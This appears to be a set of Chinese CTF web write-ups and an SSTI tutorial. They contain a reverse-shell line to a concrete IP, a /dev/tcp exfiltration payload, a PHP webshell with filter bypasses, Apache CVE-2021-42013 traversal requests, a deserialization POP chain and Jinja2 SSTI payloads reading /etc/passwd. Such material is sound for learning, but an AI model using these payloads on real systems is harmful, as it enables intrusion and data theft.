time\n\n\napp=Flask(__name__)\n\ndef waf(s):\n    blacklist = ['import','(',')',' ','_','|',';','\"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']\n    flag = True\n    for no in blacklist:\n        if no.lower() in s.lower():\n            flag= False\n            print(no)\n            break\n    return flag\n    \n\n@app.route(\"/\")\ndef index():\n    \"欢迎来到SUctf2022\"\n    return render_template(\"index.html\")\n\n@app.route(\"/calc\",methods=['GET'])\ndef calc():\n    ip = request.remote_addr\n    num = request.values.get(\"num\")\n    log = \"echo {0} {1} {2}> ./tmp/log.txt\".format(time.strftime(\"%Y%m%d-%H%M%S\",time.localtime()),ip,num)\n    \n    if waf(num):\n        try:\n            data = eval(num)\n            os.system(log)\n        except:\n            pass\n        return str(data)\n    else:\n        return \"waf!!\"\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=5000) \n```\n \n审查代码发现有`GET`传参，找到了口子。分析可知是用`GET`传参控制`num`变量，作为`log = \"echo {0} {1} {2}> ./tmp/log.txt\"`中的`{2}`。再看下去就能发现两个很敏感的函数：\n\n```\n  data = eval(num) //\n  os.system(log) //将字符串转化成命令在服务器上运行\n```\n\n[os.system()](https://blog.csdn.net/W1995S/article/details/114759238)\n由于`num`被`waf()`过滤得太多，我们只能把目标放在`os.system(log)`上，想办法对`log`下手，查找bash shell中可以做命令替换的函数：`$()、eval()与``反引号`，由于`$和eval`被过滤，这里只能选用反引号（优先执行\\`代码\\`）。[资料查阅：[反引号与$()的区别以及eval的作用](https://blog.csdn.net/hj605635529/article/details/73556855)]\n需要注意的是，程序会将num插入到log字符串的最后然后先后执行 eval（num）和os.system（log），因此不能让eval(num)报错而无法进行下一步，考虑python的特性，想到可以利用注释符`#`注释。\n接下来，我们希望建立反弹shell，将其命令行的输入输出转到我们的攻击端\n\n```\nbash -i >& /dev/tcp/攻击端IP/攻击端监听端口 0>&1\nbash -i >& /dev/tcp/101.43.119.212/12306 0>&1\n```\n\n[资料查阅：[Linux下反弹shell的原理](https://blog.csdn.net/m0_57497184/article/details/123404378)]\n但是`&`也被ban了，没法直接用，但是也能得出一个思路：**输出重定向到攻击机**。\n\n```payload：/calc?num=1%23`ls%09>/dev/tcp/IP/2333` ```\n\n这里由于空格被过滤，`ls >`写成`ls%09>`，然后在攻击端监听2333端口`nc -lvp 2333`\n然后修改`ls`命令即可，这里博主服务器监听不到，仍然在找问题。\n\n***\n\n# upgdstore\n文件上传题，随便上传一个文件试试\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191351613-1945987939.png\" width=200>\n\n由此可以得知该题目只能上传php文件。直接试试`webshell.php`传一句话木马，结果不出意料的失败了，又试了几个木马的变形，发现都无济于事，像无头苍蝇一样乱撞。只传入`phpinfo()`看看有什么收获\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191704191-1792350946.png\" width=500>\n发现一大堆`disable_functions`，基本上所有的恶意函数全部都被过滤，接下来试试用**拼接绕过**的办法读取`/etc/passwd`\n> Linux 系统中的 /etc/passwd 文件，是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读操作。\n\n这里我们用最常用的`file_get_contents() 函数`来读取文件\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/etc/passwd\");\n?>\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823211231635-994180552.png\" width=500>\n\n成功读取。\n那么根据**Web服务器的默认根文件夹**`/var/www/html`，可以尝试读取网站源码（这里尝试`index.php`），将文件代码改为\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/var/www/html/index.php\");\n?>\n```\n\n上传后打开，查看源码\n\n```\n<?php\nfunction fun($var): bool{\n    $blacklist = [\"\\$_\", \"eval\",\"copy\" ,\"assert\",\"usort\",\"include\", \"require\", \"$\", \"^\", \"~\", \"-\", \"%\", \"*\",\"file\",\"fopen\",\"fwriter\",\"fput\",\"copy\",\"curl\",\"fread\",\"fget\",\"function_exists\",\"dl\",\"putenv\",\"system\",\"exec\",\"shell_exec\",\"passthru\",\"proc_open\",\"proc_close\", \"proc_get_status\",\"checkdnsrr\",\"getmxrr\",\"getservbyname\",\"getservbyport\", \"syslog\",\"popen\",\"show_source\",\"highlight_file\",\"`\",\"chmod\"];\n\n    foreach($blacklist as $blackword){\n        if(strstr($var, $blackword)) return True;\n    }\n\n    \n    return False;\n}\nerror_reporting(0);\n//设置上传目录\ndefine(\"UPLOAD_PATH\", \"./uploads\");\n$msg = \"Upload Success!\";\nif (isset($_POST['submit'])) {\n$temp_file = $_FILES['upload_file']['tmp_name'];\n$file_name = $_FILES['upload_file']['name'];\n$ext = pathinfo($file_name,PATHINFO_EXTENSION);\nif(!preg_match(\"/php/i\", strtolower($ext))){\ndie(\"只要好看的php\");\n}\n\n$content = file_get_contents($temp_file);\nif(fun($content)){\n    die(\"诶，被我发现了吧\");\n}\n$new_file_name = md5($file_name).\".\".$ext;\n        $img_path = UPLOAD_PATH . '/' . $new_file_name;\n\n\n        if (move_uploaded_file($temp_file, $img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n            die();\n        }\n        echo '<div style=\"color:#F00\">'.$msg.\" Look here~ \".$img_path.\"</div>\";\n}\n```\n\n发现过滤掉了`$_、eval、assert`等字符串，也难怪最初尝试的后门上传失败。于是先上传了webshell的base64编码php文件——`a.php`。\n\n```\n<?php @eval($_POST[1]); ?>//不要忘记在php关键字后加空格！！！\nbase64编码绕过——>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\n但`反引号`被ban，也不知道如何把代码读取出来然后解码，也断绝了我用base64解码后再执行的想法。在其他大佬那里学到了[**PHP伪协议**](https://blog.csdn.net/cosmoslin/article/details/120695429)，了解到`php://filter`+`convert.base64-decode过滤器`能解决问题。\n> php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行\n\n```\nphp://filter/convert.base64-decode/resource=39ab6b7b4e9946f4fef4d99ee6be3446.php//php文件是刚刚上传的a.php\nbase64编码绕过——>\ncGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\n```\n\n只需要用上述代码将上传的`a.php`代码读取出来然后再用包含函数include结合即可，因此再上传`b.php`（php函数名不区分大小写，可利用此点绕过）\n\n```\n<?php Include(base64_decode(\"cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\"));?>\n```\n\n但是博主尝试了一段时间结果怎么也传不上去，人麻中麻了属于是，结果发现是上传的文件名（web64.php）经md5加密然后base64编码后出现了`dl`，被过滤了。换了名字后成功上传。\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823231937120-1672813092.png\" width=500>\n执行命令成功，但是蚁剑无法连接（大抵是因为有太多函数被ban了），只能用其他办法解决了。\n\n网上查阅其他师傅的wp，发现要用到**LD_PRELOAD劫持**，后期学习更新。\n\n资料：[浅谈LD_PRELOAD劫持](https://blog.csdn.net/qq_51295677/article/details/124338635)","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF MAY 出题人挑战赛 web","url":"/2022/12/06/2022DASCTF-MAY-出题人挑战赛-web/","content":"\n\n# Power Cookie\n\n> 提示：只有admin才可以获取flag\n\n依据提示可以猜测，本题可能需要通过修改cookie值来获取flag。\n使用Burp Suite抓包查看Response包\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102430418-1960049030.png\" width=500>\n发现`admin=0`\n于是在Request包中加入`Cookie: admin=1`\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102611588-243656756.png\" width=500>\n\n成功得到flag！\n***\n> 本题做题过程初始，博主将`Cookie: admin=1`插在了请求包的末尾（如下图所示）\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102906051-436308076.png\" width=500>\n导致始终无响应，查阅资料发现header匹配到`Upgrade`时将被终止，调整位置后成功解决，原因庶几如此（[请求头 header中传cookie不生效原因](http://t.zoukankan.com/qinmengjiao123-123-p-13685262.html)）\n\n***\n***\n\n# 魔法浏览器\n进入后得到提示：\n> 提示：flag.txt\n为保证文档安全。请使用魔法浏览器来访问。\n\n不明所以，F12查看\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817104826955-2116924557.png\" width=500>\n得到进一步提示，需要`let ua = \"\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35\"`\n结合“使用魔法浏览器”可以猜想到应该将请求报文中的User-Agent修改为其要求的“Magic”内容\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75\n```\n\n发送，成功得到flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817105507623-1654583652.png\" width=500>\n\n[看其他师傅的wp时发现可以用console执行js，而不用去utf-8转码，又学到了一点]<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817110336451-169494747.png\" width=700>\n\n***\n***\n\n# getme\n\nF12查看，一脸懵逼\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182444328-2077107608.png\" width=500>\n除了一行路径`pwd:/usr/local/apache2/`，得知其是apache，别无其它信息。\n抓包查看返回包：\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182848657-222743158.png\" width=\"200\">\n只能说“黔驴技穷”。之后查找师傅们的wp和网上的各种资料，得知**Apache/2.4.50 (Unix)**版本存在任意路径穿越漏洞（这时再回想起一开始的那一行路径，或许也是在提示这一点罢）。\n[ [Apache 远程代码执行（CVE-2021-42013）](https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp)]\n直接找到CVE，用poc和exp去打\n> //查看任意文件\n`GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1`\n\n(若将`etc/passwd`改为`flag`，则可读取到flag，不过是假的，我们后面再看)\n> //执行任意命令\n`GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1`\n\n我们利用exp和Burp Suite发送命令\n`echo Content-Type: text/plain; echo;ls /\n//这里的Content-Type: text/plain 规定将文件设置为纯文本的形式`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184819761-451478684.png\" width=500>\n\n从而查看到所有的文件名，在其中发现flag，试图`echo;cat /flag`读取\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184950024-333636240.png\" width=500>\n结果发现为假，只能从其他的文件下手，这里凭运气选一个最奇怪的`diajgk`，然后一层层查看，最终在第四层发现一个貌似flag的文件，cat读取得到flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185335437-2104134847.png\" width=500>\n***\n这一题有三个问题在耗费了大量的时间，需要找时间再去理解清晰：\n1、在找flag的点上存在一些问题，如果要一个个去把文件都试一遍未免过于离谱。在找办法的过程中发现一位师傅通过分析查看日志的办法找到最终真正的flag的路径，不过因为不知道其使用了怎么样的命令而无法复现（点击图片可跳转到这位师傅的博客）\n[<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185839323-780544381.png\" width=500>](https://blog.csdn.net/RABCDXB/article/details/124994738)\n2、如何运用该exp去执行更多其他的命令，有何规范？（我自己尝试的cd、tail等均无效）\n3、echo有什么作用，与分号联合怎样使用？\n***\n***\n\n# hackme\n\n这题不出意外的没有什么思路，发现**GOTOLIST**是可以点击的链接，里面又有8个链接，一个个点进去，没有头绪，奇怪的是users点进去出现了这样一句：\n> Sorry there doesn't seem to be a users.go file\n\n又结合最后一个链接——上传一个**.go**文件，猜测需要用该链接上传一个名叫**users.go**的go文件，然后点击users执行文件。然而博主并不知道什么是go文件，也不知道怎么用，继续懵逼着去翻大佬们的wp，得知可以找到执行命令的go脚本 [os/exec 执行命令的五种姿势](https://golang.iswbm.com/c05/c05_02.html)！\n\n选择执行命令并且能获取结果的办法\n\n```\npackage main\n\nimport (\n\"fmt\"\n\"log\"\n\"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"ls\",\"/\")\n    out, err := cmd.CombinedOutput()\n    if err != nil {\n        fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n        log.Fatalf(\"cmd.Run() failed with %s\\n\", err)\n    }\n    fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n}\n```\n\n发现成功执行了`ls /`命令\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203359350-1628717592.png)\n且成功找到了藏起来的flag，将`cmd := exec.Command(\"ls\",\"/\")`更改为`cmd := exec.Command(\"cat\",\"/flag\")`\n![成功获取flag](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203655197-291459483.png)\n成功获取flag！\n\n***\n***\n\n# ezcms\n\n下载文件后，发现有`admin.php`文件\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818201224459-1716179419.png\" width=200>\n\n得知该网站存在后台，对文件全局搜索“密码”，碰巧发现\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818202107960-1160034001.png\" width=500>\n\n用`admin 123456`成功登入后台。逛了一圈，能点的都点了一遍，没发现什么可利用的信息。于是一个个翻看源码，可是博主不够敏锐，没能发现存在着`Update.php`可以上传文件，后来查看其他大佬的wp才回过神来：嗯，在admin文件夹里，确实应该再仔细看一看。\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203053359-275459141.png\" width=600>\n\n这段代码告诉我们，在这个页面，可以用`GET`方式传`url`值，然后该`url`经`sys_auth()`函数处理后就会被下载，判断`Content-Type`值为`application/zip`就会被解压，然后输出 `版本升级成功~`\n\n于是考虑`sys_auth()`函数作何用处——加密或解密\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203716598-553405938.png\" width=500>\n且可判断，当`type=0`时加密，传入`type=1`为解密。\n那么就思路便明确了，我们只需要在vps上部署一个“一句话木马”的压缩文件（.zip），得到`webshell.zip`的url，然后将该url用源码中的`sys_auth()`加密，最后以GET方式把加密后的url上传即可，具体实现如下：\n\n```\n<?php\ndefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');\n\n//字符加密、解密 [0为加密，1为解密]\nfunction sys_auth($string, $type = 0, $key = '', $expiry = 0) {\n\tif(is_array($string)) $string = json_encode($string);\n\tif($type == 1) $string = str_replace('-','+',$string);\n\t$ckey_length = 4;\n\t$key = md5($key ? $key : Mc_Encryption_Key);\n\t$keya = md5(substr($key, 0, 16));\n\t$keyb = md5(substr($key, 16, 16));\n\t$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\n\t$cryptkey = $keya.md5($keya.$keyc);\n\t$key_length = strlen($cryptkey);\n\t$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\n\t$string_length = strlen($string);\n\t$result = '';\n\t$box = range(0, 255);\n\t$rndkey = array();\n\tfor($i = 0; $i <= 255; $i++) {\n\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\n\t}\n\tfor($j = $i = 0; $i < 256; $i++) {\n\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\n\t\t$tmp = $box[$i];\n\t\t$box[$i] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t}\n\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\n\t\t$a = ($a + 1) % 256;\n\t\t$j = ($j + $box[$a]) % 256;\n\t\t$tmp = $box[$a];\n\t\t$box[$a] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\n\t} \n\tif($type == 1) {\n\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\n\t\t\t$result = substr($result, 26);\n\t\t\t$json = json_decode($result,1);\n\t\t\tif(!is_numeric($result) && $json){\n\t\t\t\treturn $json;\n\t\t\t}else{\n\t\t\t\treturn $result;\n\t\t\t}\n\t\t}\n\t\treturn '';\n\t}\n\treturn str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));\n}\n//以下为利用源码函数进行sys加密\n$ans=sys_auth(\"http://ip.ip.ip.ip/acmd.zip\");//我上传的webshell压缩文件名为acmd.zip\nvar_dump($ans);\n\n?>\n```\n\n利用如上exp得到加密的url：\n> 事实上博主第一次失败了，发现原来代码里还存在着一个全局变量![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818204653057-598288141.png)\n跟踪查找即可以找到`define('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');`\n加上这句定义后成功\n\n`string(79) \"498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q\"`\n拿到加密url后直接上传：\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205303419-51425222.png\" width=500>\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205518891-1217499246.png\" width=500>\n\n成功！接下来，我便开始试图在`update.php`源码中找到文件下载或解压后所在的位置，此间跟踪了几个类、函数如`mczip->PclZip()`结果并没有分析出什么来，只得再去翻看其他师傅的wp，发现他们的后门就在根目录下，于是蚁剑🗡连接，flag还是在根目录下:\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818210721537-1371645933.png\" width=500>\n\n打开后成功得到flag`DASCTF{86527acc-676d-4267-a1a1-b46337a3a2a6}`\n***\n这题于我而言很扯淡的点就是vps部署和解压目录查找，一开始我脑子有点进淼竟然用本地的PHP study搭建的网站上传压缩包......结果当然就是失败，报错信息是`压缩包不zip类型文件`我直接傻掉，一直在想如何把压缩包的content type类型调成他要求的zip，完全忽略了他根本进不了我的本地站点...后来部署在vps上成功得以解决；至于第二点仍需要学习，希望**多指教**~","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF Sept X 浙江工业大学秋季挑战赛 web","url":"/2022/12/06/2022DASCTF-Sept-X-浙江工业大学秋季挑战赛-web/","content":"# hellounser\n直接可读源码\n```\n<?php\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();\n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    }\n    \n    \n}\n\nif(isset($_GET['pop'])){\n    $aaa = unserialize($_GET['pop']);\n    $aaa();\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n审计代码发现需要GET方式传入”pop”，然后经反序列化后被调用。\nA类中的`_invoke()`魔术方法能在A类被调用为函数时触发，从而调用`show()`函数，输出`$var`，而B类中的`_toString()`魔术方法能在B类被当作字符串使用时触发，若让`$var=B`类，则`_toString()`被触发时调用B的`show()`函数。\n查看B类中`show()`函数，`func`、`arg`被绕过后则可包含”flag.php”文件，注释中提到不会输出，便只能依赖`$func`函数——有两个参数，且能执行任意命令，可利用`cretae_function`，既绕过了`func`的匹配，又可以执行（这里需要用`}`闭合函数）。\n由此构造如下代码\n\n```\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}var_dump(get_defined_vars());//\";\n$a->var=$b;\n\necho urlencode(serialize($a));\n```\n\n传入`” cretae_function”`作为$函数名，然后将`\"}var_dump(get_defined_vars());//\"`传入`arg`，从而绕过了匹配并执行`$func('', $this->arg); `，相当于执行如下代码\n\n```\ncreate_function(\"\",}var_dump(get_defined_vars());//)\n也即--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n```\n\n这里的`var_dump()`函数可以输出变量的相关信息，显示关于一个或多个表达式的结构信息，包括表达式的类型与值（其中数组会递归展开值，通过缩进显示其结构）；而`get_defined_vars()`函数能返回由所有已定义变量所组成的数组，通过这两个函数能看到所有已定义变量。\n经以上代码执行便可得到序列化`$a`的url编码，传入后得到\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816220606569-998092554.png)\n发现真正的flag藏在一个叫Tru3flag.php的文件里，因此base64绕过后，用`require()`函数包含执行[或者cat查看用取反绕过的办法]\n`require(base64_decode(VHJ1M2ZsYWcucGhw));`\n修改后的完整代码如下\n\n```\nclass A {\n    public $var;\n    public function show(){\n        echo $this->var;\n    }\n    public function __invoke(){\n        $this->show();\n    }\n}\n\nclass B{\n    public $func;\n    public $arg;\n    \n    public function show(){\n        $func = $this->func;\n        if(preg_match('/^[a-z0-9]*$/isD', $this->func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this->arg)) { \n            die('No!No!No!'); \n        } else { \n            include \"flag.php\";\n            //There is no code to print flag in flag.php\n            $func('', $this->arg); \n        }\n    }\n    \n    public function __toString(){\n        $this->show();  \n        return \"<br>\".\"Nice Job!!\".\"<br>\";\n    } \n}\n\n$a=new A();\n$b=new B();\n\n$b->func=\"create_function\";\n$b->arg=\"}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//\";\n$a->var=$b;\n/*\ncreate_function(\"\",}var_dump(get_defined_vars());//)\n--------->\ncfunction(\"\"){\n}var_dump(get_defined_vars());//}\n*/\necho urlencode(serialize($a));\n?>\n```\n\n得到flag\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220816221213537-1615985978.png)\n\n---\n附经常使用到的**魔术方法**\n（来自 [php反序列化漏洞之POP链构造](https://www.jianshu.com/p/7ec82ffc457d)）\n\n```\n__construct()  //当对象创建时触发\n__destruct()   //当对象销毁时触发\n__wakeup()     //当使用unserialize时触发\n__sleep()     //当使用serialize时触发\n__destruct()  //当对象被销毁时触发\n__call()      //当对象上下文中调用不可访问的方法时触发\n__get()       //当访问不可访问或不存在的属性时触发\n__set()       //当设置不可访问或不存在属性时触发\n__toString()  //当把类当作字符串使用时触发\n__invoke()    //当对象调用为函数时触发\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"服务器端模板注入（SSTI）","url":"/2022/12/06/服务器端模板注入（SSTI）/","content":"# 一、SSTI简介\nSSTI， 即 **Server-Side Template Injection，服务器端模板注入**。\n\n## 1、SSTI产生原因\n在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给View ，这样就最终显示在我们的面前了，那么这里的 **View** 中就会大量地用到一种叫做**模板**的技术。\n绕过服务端接收了用户的恶意输入后，**未经任何处理**就将其作为web应用模板内容的一部分，而模板引擎在**进行目标编译渲染**的进程中，执行了用户恶意攻击者插入的可以破坏模板的语句，就会导致信息泄露、代码执行、GetShell等问题。\n>**网站模板引擎:**\n模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。\n模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。\n\n>现行的模板引擎有:\nPHP 的     Smarty, Twig, Blade.\nJava 的    JSP, FreeMareker, Velocity.\nPython 的  Flask(Jinja2), django, tornado\n\n......\n\n简单来说，可以理解为利用模板引擎来生成前端的HTML代码。模板引擎会会提供一套生成HTML代码的程序，然后只需要获取用户的数据，将其放到渲染函数里，最后生成模板+用户数据的前端HTML页面，反馈给浏览器，从而呈现在用户面前。当这里的“用户的数据”具有恶意攻击性而又不被处理时，SSTI就发生了。\n\n## 2、SSTI检测工具 Tplmap\n\n>工具地址:https://github.com/epinna/tplmap\n安装教程:https://www.cnblogs.com/ktsm/p/15691652.html\n使用教程：https://blog.csdn.net/EC_Carrot/article/details/109709767\n\n【参考资料：**[详解SSTI模板注入](https://blog.csdn.net/LYJ20010728/article/details/120205725)**】\n\n# 二、SSTI 利用\n>以Flask（Jinja2）为例（windows），该版块仅涉及主机上的python语法\n\n## Ⅰ. 基础知识\n### 1、Python 内建函数\n启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数。在 Python 交互模式下，使用命令 `dir('builtins')` 即可查看当前 Python 版本的一些内建变量、内建函数，**内建函数可以调用一切函数**。\n### 2、Python 类继承\nPython 中一切皆为对象，均继承于 object 对象，Python 中的 object 类中集成了很多的基础函数，假如需要在 payload 中使用某个函数就需要用 object 去操作。\n\n常见的**继承关系**有以下三种：\n\n```\n1. base ：对象的一个基类，一般是object\n2. mro  ：获取对象的基类，只是这时会显示整个继承链的关系，是一个列表，而object在最列表的最顶层，通过mro[-1]可以获取到\n3. subclasses() : 继承此对象的子类，返回一个列表\n```\n\n## Ⅱ. 构造payload\n<br>\n\n**攻击方式为：变量->对象->基类->子类遍历->全局变量**\n\n### 1、相关属性\n\n```\n对于返回的是类实例：\n1. __class__            //返回实例的对象，可以使实例指向class，从而使用下面的魔术方法\n如：\n>>>''.__class__  \n<class 'str'>\n\n对于返回的是定义的class类：\n2. __base__              //返回类的父亲 python3\n3. __mro__               //返回类继承的元组，即寻找父类 python3\n4. __subclasses__()      //返回类中仍然可用的引用，可以此获取想要的类的对象 python3\n如：\n>>> ''.__class__.__mro__[-1].__subclasses__()[138]  \n<class 'os._wrap_close'>   \nTip：根据索引值来获取想用的可利用类,不加索引会输出全部存活的引用\n\n5. __builtins__          //作为默认初始模块出现，可用于查看当前所有导入的内建函数\n6. __globals__           //对包含函数全局变量的字典的引用。如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量 python3\n7. __init__              //返回类的初始化方法\n如：\n>>> ''.__class__.__bases__[0].__subclasses__()[38].__init__\n<slot wrapper '__init__' of 'object' objects>\nTip: 'wrapper'是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性\n```\n\n### 2、一个简单的payload寻找过程\n#### Ⅰ. 找到`__globals__`全局\n根据上述属性，找到重载过的 `__init__` 类（在获取初始化属性后，带 `wrapper` 的说明没有重载，因此寻找**`不带 warpper`** 的即可），并通过 `__globals__` 全局来查找所有的方法及变量及参数，或者获取 `file` 、 `os` 等模块以进行下一步的利用。\n\n```\n>>> ''.__class__.__bases__[0].__subclasses__()[138].__init__\n<function _wrap_close.__init__ at 0x0000025AA50BAEE0>\n```\n\n#### Ⅱ. 查看其引用`__builtins__`\n\n```\n''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['__builtins__']            \nTip：这里会返回 dict 类型，寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能\n```\n\n![](https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220915221230348-826204857.png)\n\n#### Ⅲ. 使用可利用函数实现文件读取功能等\n\n`''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()\n`\n### 3、常用的目标函数\n\n```\nfile\nsubprocess.Popen\nos.popen\nexec\neval\n```\n\n>几个含有`eval`函数的类：\nwarnings.catch_warnings\nWarningMessage\ncodecs.IncrementalEncoder\ncodecs.IncrementalDecoder\ncodecs.StreamReaderWriter\nos._wrap_close\nreprlib.Repr\nweakref.finalize\n......\n\n### 4、命令执行\nPython常用的三种**命令执行**方式：\n\n> `os.system()`\n该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 